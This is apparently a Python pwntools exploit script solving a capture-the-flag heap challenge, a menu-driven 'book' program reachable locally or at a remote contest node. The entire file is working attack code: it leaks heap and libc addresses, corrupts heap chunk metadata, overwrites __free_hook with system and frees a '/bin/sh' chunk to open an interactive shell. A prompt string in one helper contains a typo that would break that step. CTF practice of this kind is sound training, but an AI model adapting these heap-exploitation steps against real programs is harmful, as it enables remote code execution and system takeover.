import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./pwn')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28393)
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		def name(a):
			io.sendlineafter('Name of the book you want to create: ',a)

		def add1(a):
			io.sendlineafter('Your choice:','1')
			io.sendlineafter('Chapter name:',a)
			
		def add2(a,b):
			io.sendlineafter('Your choice:','2')
			io.sendlineafter('Which chapter do you want to add into:',a)
			io.sendlineafter('Section name:',b)

		def add3(a,b,c):
			io.sendlineafter('Your choice:','3')
			io.sendlineafter('Which section do you want to add into:',a)
			io.sendlineafter('How many chapters you want to write:',str(b))
			io.sendlineafter('Text:',c)

		def delete1(a):
			io.sendlineafter('Your choice:','4')
			io.sendlineafter('Chapter name:',a)

		def delete2(a):
			io.sendlineafter('Your choice:','5')
			io.sendlineafter('Section name:',a)

		def delete3(a):
			io.sendlineafter('Yo dur choice:','6')
			io.sendlineafter('Section name:',a)

		def show():
			io.sendlineafter('Your choice:','7')
			
		def edit1(a,b):
			io.sendlineafter('Your choice:','8')
			io.sendlineafter(':','Chapter')
			io.sendlineafter(':',a)
			io.sendlineafter(':',b)

		def edit2(a,b):
			io.sendlineafter('Your choice:','8')
			io.sendlineafter(':','Section')
			io.sendlineafter(':',a)
			io.sendlineafter(':',b)

		def edit3(a,b):
			io.sendlineafter('Your choice:','8')
			io.sendlineafter(':','Text')
			io.sendlineafter(':',a)
			io.sendlineafter(':',b)

			

		name('keer')
		add1('keer')
		io.sendlineafter('Your choice:','2')
		io.sendlineafter('Which chapter do you want to add into:','keer')
		io.recvuntil('0x0x')
		heap_base=int(io.recv(12),16)-0x130
		io.sendlineafter('Section name:','keer')
		add3('keer',0x80,'a'*0x20+p64(heap_base+0x170)+p64(0x111))
		edit3('keer','a'*0x20+p64(heap_base+0x170)+p64(0x111)+'\x00'*0x58+p64(0x0000000000020e11))
		add1('keer1')
		add2('keer1','keer1')
		add3('keer1',0x80,'keer1')
		add1('keer2')
		add2('keer2','keer2')
		add3('keer2',0x80,'/bin/sh\x00')
		delete2('keer')
		edit1('keer','a'*0x20+'\x70')
		show()
		io.recvuntil('Section:')
		data=io.recv(6)
		libc_base=u64(data+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		libc.address=libc_base
		edit2(data,'aaaaaaaa'+'\x00'*0x18+p64(libc.sym['__free_hook'])+p64(0x111))
		edit3('a'*8,p64(libc.sym['system']))
		delete3('keer2')



		success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))

		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue